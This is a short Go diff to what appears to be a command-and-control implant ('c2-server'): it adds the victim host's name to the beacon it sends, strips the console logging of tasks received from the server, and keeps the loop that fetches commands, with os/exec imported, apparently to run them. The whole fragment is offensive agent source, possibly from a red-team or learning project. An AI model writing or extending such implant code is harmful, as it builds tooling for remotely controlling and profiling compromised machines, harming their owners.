@@ -4,8 +4,8 @@ import (
 	"bytes"
 	"c2-server/models"
 	"encoding/json"
-	"fmt"
 	"net/http"
+	"os"
 	"os/exec"
 	"runtime"
 	"time"
@@ -14,7 +14,8 @@ import (
 func sendBeacon(id string) *http.Response {
 	var beacon models.NewBeacon
 	beacon.ID = id
-
+	hostName, _ := os.Hostname()
+	beacon.Hostname = hostName
 	jsonData, err := json.Marshal(beacon)
 	if err != nil {
 		panic(err)
@@ -30,9 +31,8 @@ func recvTask(r *http.Response) string {
 	var task models.NewTask
 	err := json.NewDecoder(r.Body).Decode(&task)
 	if err != nil {
-		fmt.Println("Error receiving task from server: " + err.Error())
+		panic(err)
 	}
-	fmt.Println("[server] ---> Task: " + string(task.Command))
 	return task.Command
 }
 
